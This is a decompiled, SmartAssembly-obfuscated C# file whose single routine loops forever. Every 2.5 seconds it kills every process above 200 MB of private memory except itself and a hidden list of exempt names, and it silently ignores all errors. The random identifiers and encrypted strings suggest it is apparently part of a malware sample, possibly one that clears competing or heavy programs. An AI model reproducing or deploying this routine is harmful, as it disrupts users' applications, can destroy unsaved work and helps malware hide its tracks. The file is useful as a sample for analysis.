using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace YBTDaqZXTw;

public static class oPHxaGLBsZUWs
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void RNIUmbQzQKGf()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107403517)) && !process.ProcessName.Contains(getString_0(107403540)) && !process.ProcessName.Contains(getString_0(107403531)) && !process.ProcessName.Contains(getString_0(107403490)) && !process.ProcessName.Contains(getString_0(107403509)) && !process.ProcessName.Contains(getString_0(107403496)) && !process.ProcessName.Contains(getString_0(107403451)) && !process.ProcessName.Contains(getString_0(107403470)) && !process.ProcessName.Contains(getString_0(107403425)) && !process.ProcessName.Contains(getString_0(107403444)) && !process.ProcessName.Contains(getString_0(107403903)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static oPHxaGLBsZUWs()
	{
		Strings.CreateGetStringDelegate(typeof(oPHxaGLBsZUWs));
	}
}
